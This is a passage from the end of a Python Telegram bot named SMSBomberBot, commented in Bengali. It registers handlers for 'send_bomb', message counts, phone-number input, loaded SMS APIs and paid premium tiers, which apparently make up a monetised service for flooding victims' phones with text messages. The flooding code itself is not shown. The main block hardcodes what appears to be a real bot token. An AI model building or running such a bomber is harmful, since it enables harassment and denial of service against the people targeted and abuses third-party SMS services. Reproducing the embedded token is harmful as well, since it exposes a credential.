            job_queue.run_repeating(self.backup_stats, interval=43200, first=60)
    
    # ====================== রান ======================
    
    def run(self):
        self.app = Application.builder().token(self.token).build()
        
        # কমান্ড হ্যান্ডলার
        self.app.add_handler(CommandHandler("start", self.start))
        self.app.add_handler(CommandHandler("cancel", self.cancel_command))
        self.app.add_handler(CommandHandler("admin", self.admin_dashboard))
#        self.app.add_handler(CommandHandler("api_stats", self.api_stats))
        self.app.add_handler(CommandHandler("broadcast", self.broadcast_command))
        
        # কলব্যাক হ্যান্ডলার
        self.app.add_handler(CallbackQueryHandler(self.check_join_callback, pattern="check_join"))
        self.app.add_handler(CallbackQueryHandler(self.coins_callback, pattern="coins"))
        self.app.add_handler(CallbackQueryHandler(self.daily_bonus_callback, pattern="daily_bonus"))
        self.app.add_handler(CallbackQueryHandler(self.stats_callback, pattern="stats"))
        self.app.add_handler(CallbackQueryHandler(self.refer_callback, pattern="refer"))
        self.app.add_handler(CallbackQueryHandler(self.premium_callback, pattern="premium"))
        self.app.add_handler(CallbackQueryHandler(self.buy_premium_callback, pattern="buy_premium"))
        self.app.add_handler(CallbackQueryHandler(self.send_bomb_callback, pattern="send_bomb"))
        self.app.add_handler(CallbackQueryHandler(self.count_callback, pattern="count_"))
        self.app.add_handler(CallbackQueryHandler(self.custom_count_callback, pattern="custom_count"))
        self.app.add_handler(CallbackQueryHandler(self.help_callback, pattern="help"))
        self.app.add_handler(CallbackQueryHandler(self.back_main_callback, pattern="back_main"))
        self.app.add_handler(CallbackQueryHandler(self.leaderboard_callback, pattern="leaderboard"))
        self.app.add_handler(CallbackQueryHandler(self.custom_api_callback, pattern="custom_api"))
        self.app.add_handler(CallbackQueryHandler(self.language_callback, pattern="language"))
        self.app.add_handler(CallbackQueryHandler(self.set_language_callback, pattern="lang_"))
        self.app.add_handler(CallbackQueryHandler(self.free_trial_callback, pattern="free_trial"))
        self.app.add_handler(CallbackQueryHandler(self.admin_api_stats, pattern="admin_api_stats"))
        self.app.add_handler(CallbackQueryHandler(self.admin_broadcast, pattern="admin_broadcast"))
        self.app.add_handler(CallbackQueryHandler(self.admin_dashboard_callback, pattern="admin_dashboard"))
        
        # মেসেজ হ্যান্ডলার
        self.app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, self.handle_phone_input))
        self.app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, self.handle_custom_api))
        self.app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, self.handle_custom_count))
        
        self.setup_jobs()
        
        print("🤖 বট চালু হচ্ছে...")
        print("✅ সব ফিচার লোড হয়েছে!")
        print(f"📊 {len(self.apis.get_all_apis())}টি API লোড হয়েছে!")
        print(f"👑 অ্যাডমিন: {self.ADMIN_IDS}")
        print(f"📢 চ্যানেল: @{self.CHANNEL_USERNAME}")
        self.app.run_polling(allowed_updates=Update.ALL_TYPES)

# ====================== মেইন ======================

if __name__ == "__main__":
    BOT_TOKEN = "8218480747:AAEhdGCthvhMaGLKvpaBtHwo0o40WYKoLHA"
    bot = SMSBomberBot(BOT_TOKEN)
    bot.run()
